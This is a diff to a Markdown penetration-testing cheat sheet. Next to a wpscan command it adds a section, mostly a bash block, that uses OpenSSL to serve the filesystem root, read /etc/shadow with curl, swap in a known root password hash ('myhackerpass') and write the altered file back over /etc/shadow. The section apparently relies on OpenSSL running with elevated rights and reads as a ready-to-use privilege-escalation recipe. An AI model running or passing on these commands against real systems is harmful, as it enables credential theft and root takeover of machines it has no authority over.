@@ -70,3 +70,32 @@ EOF
 ### Wordpress Vulnerability Scans
 
 `wpscan --url 10.x.x.x`
+
+### Overwriting /etc/shadow with OpenSSL
+
+```bash
+# Create keys in /tmp for easy access
+cd /tmp
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+
+# Switch serving directory to /
+cd /
+
+# Start https content server with generated certs
+openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 1337 -HTTP
+
+# In another local shell, retrieve /etc/shadow
+curl -k https://localhost:1337/etc/shadow
+
+# Modify root password with `hash:password` - `$1$mysalt$7DTZJIc9s6z60L6aj0Sui.` = myhackerpass
+# Alternatively - openssl passwd -6 -salt xyz  yourpass ; -6 = SHA-512, -5 = SHA-256 and -1 = MD5
+
+# Encrypt shadow file
+openssl smime -encrypt -aes256 -in /tmp/shadow -binary -outform DER -out /tmp/shadow.enc /tmp/cert.pem
+
+# Set back to root directory for restoring /etc/shadow
+cd /
+
+# Restore encrypted shadow file to /etc/shadow
+openssl smime -decrypt -in /tmp/shadow.enc -inform DER -inkey /tmp/key.pem -out /etc/shadow
+```
